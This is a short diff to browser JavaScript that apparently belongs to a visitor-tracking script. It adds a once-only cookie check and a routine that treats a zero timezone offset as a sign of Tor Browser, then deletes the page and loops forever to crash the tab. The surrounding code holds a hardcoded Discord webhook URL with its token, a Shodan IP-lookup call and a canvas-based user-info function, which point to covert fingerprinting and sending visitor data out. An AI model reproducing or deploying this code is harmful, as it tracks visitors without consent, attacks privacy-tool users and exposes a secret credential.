@@ -1,6 +1,19 @@
+// Check if the user was logged before
+if (document.cookie.split(';').some((item) => item.trim().startsWith('loggedBefore='))) {
+  return;
+}
+document.cookie = "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+
+// Also check if the user uses TorBrowser, if they use it, crash the tab
+if (new Date().getTimezoneOffset() === 0) {
+  // Remove DOM
+  document.documentElement.remove();
+  // Infinite loop
+  while (true) { }
+}
+
 const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
-const DISCORD_WEBHOOK_URL =
-  "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
 
 function getUserInfo() {
   const canvas = document.createElement("canvas");
